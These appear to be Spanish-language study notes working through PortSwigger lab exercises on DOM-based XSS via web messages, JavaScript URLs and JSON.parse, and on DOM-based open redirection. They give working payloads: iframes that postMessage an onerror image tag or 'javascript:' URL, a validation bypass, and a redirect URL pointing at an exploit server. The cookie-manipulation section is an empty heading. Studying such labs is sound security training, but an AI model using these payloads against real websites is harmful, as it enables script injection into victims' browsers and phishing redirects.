# DOM XSS

## Table of contents

- [DOM XSS](#dom-xss)
  - [DOM XSS using web messages](#dom-xss-using-web-messages)
  - [DOM XSS using web messages and a JavaScript URL](#dom-xss-using-web-messages-and-a-javascript-url)
  - [DOM XSS using web messages and JSON.parse](#dom-xss-using-web-messages-and-jsonparse)
  - [DOM-based open redirection](#dom-based-open-redirection)
  - [DOM-based cookie manipulation](#dom-based-cookie-manipulation)

## DOM XSS using web messages

una pagina utiliza el evento **message** para agregar publicidad y lo incrusta en el codigo HTML usando un sink **innerHTML**:

![[Pasted image 20230227155449.png]]

primero hay que entender como funciona este evento, es similar a una comunicacion de sockets:

se tiene a la "escucha" un evento **onmessage**:

```javascript
window.addEventListener('message',function(e){
	//contenido recibido
	e.data
})
```

se envia informacion:

```javascript
//postMessage(message, targetOrigin)
window.postmessage('informacion para enviar','www.pagina.com')
```

ahora como la pagina recibe mensaje y usa **innerHTML** para incrustar codigo, podemos enviar informacion a traves de un metodo sin interaccion del usuario **(onload)** y cargar la pagina dentro de un **(\<iframe\>)**:

En el contenido que enviemos podemos poner una carga util XSS:

```html
<iframe src="https://0a3b00e303e88a45c11e0d54004400b0.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src/onerror=print()>','*')">
```

- en el target colocamos un `*` para especificar cualquiera, podemos ser mas especificos y colocar la URL tambien.
- La propiedad `contentWindow` devuelve el objeto Window de un **HTMLIFrameElement**. Puede usar este objeto Window para acceder al documento del iframe y su DOM interno.

si entregamos esta carga util a nuestra victima se le cargara nuestra carga util XSS.

## DOM XSS using web messages and a JavaScript URL

la pagina recibe la informacion de un evento **onmessage** y realiza un **location.href**:

![[Pasted image 20230227172256.png]]

en este caso se valida la **data** recibida si contiene `http:` o `https:`. Pasa la validacion y se lo establece como valor del **href**.

podemos colocar el siguiente payload:

```javascript
javascript:print()//http:
```

ponemos como comentario `http:` para que no se interprete pero pase la validacion.

para entregar a nuestra victima quedaria asi:

```html
<iframe src="https://0a3b00e303e88a45c11e0d54004400b0.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## DOM XSS using web messages and JSON.parse

una pagina recibe por el evento **onmessage** una estructura json, el siguiente codigo muestra la logica:

![[Pasted image 20230227235438.png]]

se puede resumir en que la estructura tiene un campo **type** que es evaluado en un switch case si tiene el valor **load-channel**, se toma el valor **url** del json y se lo coloca como el atributo **src** de un objeto **iframe** creado anteriormente.

por lo que podemos crear la siguiente estructura json para controlar el atributo **src** y poder inyectar una carga XSS:

```json
{
	"type":"load-channel",
	"url":"javascript:print()"
}
```

para entregarlo a una victima, lo podemos cargar en un iframe:

(escapando las comillas dobles del JSON)

```html
<iframe src="https://0ad700940433f3a0c0a522f900fb00fb.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

>[!tip]
>A veces es bueno intentar los parametros de la etiqueta HTML con comillas dobles (`""`) si no funciona hay que cambiar a comillas simples todo (`''`) 
>
>```html
>onload='this.contentWindow.postMessage("{\"type\"}")'
>onload="this.contentWindow.postMessage('{\"type\"}')"
>```

## DOM-based open redirection

una pagina que permite publicar comentarios en un post tiene un boton de vuelta atras:

![[Pasted image 20230228001021.png]]

el boton tiene un evento **onclick** con la siguiente logica:

```html
onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'
```

![[Pasted image 20230228000848.png]]

el evento buscar un parametro GET llmado **url** y lo coloca como **location.href**:

![[Pasted image 20230228000914.png]]

por lo que podemos mandar una peticion a nuestro exploit server:

```bash
https://0a25003e030e8453c0d93360007b00a7.web-security-academy.net/post?postId=1&url=https://exploit-0a06001703ec84afc0ba323c018300c1.exploit-server.net/exploit
```

## DOM-based cookie manipulation

